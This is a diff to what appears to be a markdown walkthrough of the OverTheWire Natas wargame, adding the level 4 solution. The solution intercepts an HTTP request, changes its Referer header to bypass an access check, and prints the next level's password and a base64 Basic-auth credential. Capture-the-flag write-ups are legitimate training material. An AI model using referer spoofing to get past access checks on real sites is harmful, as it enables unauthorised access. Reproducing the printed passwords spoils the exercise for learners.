@@ -78,6 +78,29 @@ natas4:
     Username: natas4
     URL:      http://natas4.natas.labs.overthewire.org
 
+<img width="1245" height="299" alt="image" src="https://github.com/user-attachments/assets/320a1640-7fc2-4b63-a95c-7c27294783e9" />
+
+Click `Refresh page` and intercept this request
+
+    GET /index.php HTTP/1.1
+    Host: natas4.natas.labs.overthewire.org
+    Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://natas4.natas.labs.overthewire.org/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US,en;q=0.9
+    Connection: keep-alive
+
+Change the Referer from `natas4` to `natas5` and forward the packet
+
+<img width="1488" height="875" alt="image" src="https://github.com/user-attachments/assets/626572b4-ee6e-4782-a024-b5d76b7c4095" />
+
+natas5:
+
+    0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+
 ## Level 4 → Level 5
 
     Username: natas5
